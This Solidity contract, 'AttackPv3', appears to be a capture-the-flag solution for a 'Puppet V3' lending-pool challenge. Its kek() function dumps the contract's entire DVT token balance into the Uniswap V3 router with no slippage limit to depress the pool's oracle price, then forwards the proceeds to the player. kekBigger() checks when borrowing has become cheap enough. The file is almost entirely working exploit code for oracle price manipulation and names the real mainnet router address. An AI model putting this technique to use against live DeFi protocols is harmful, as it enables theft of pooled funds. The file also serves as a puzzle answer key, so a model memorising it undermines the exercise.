// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "./PuppetV3Pool.sol";

interface IERC20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address to, uint256 amount) external returns (bool);
}

contract AttackPv3 {
  address immutable player;
  address immutable DVT;
  address immutable weth;
  PuppetV3Pool immutable pool;
  uint24 constant FEE = 3000;
  // uniswap v3: router from etherscan.io
  ISwapRouter constant routerV3 = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

  constructor (address _player, address _DVT, address _weth, address _pool) {
    player = _player;
    DVT = _DVT;
    weth = _weth;
    pool = PuppetV3Pool(_pool);
  }
    
  function kek() public {
    IERC20(DVT).approve(address(routerV3),type(uint256).max);
    ISwapRouter.ExactInputSingleParams memory encodedParams = ISwapRouter.ExactInputSingleParams(DVT,weth,FEE,address(this),type(uint256).max,IERC20(DVT).balanceOf(address(this)),0,0);

    routerV3.exactInputSingle(encodedParams);
    IERC20(weth).transfer(player,IERC20(weth).balanceOf(address(this)));
    IERC20(DVT).transfer(player,IERC20(DVT).balanceOf(address(this)));
  }

  function kekBigger(uint256 tokenIn) public view returns (bool) {
    if (pool.calculateDepositOfWETHRequired(tokenIn)>IERC20(weth).balanceOf(player))
      return true;
    else return false;
  }
}
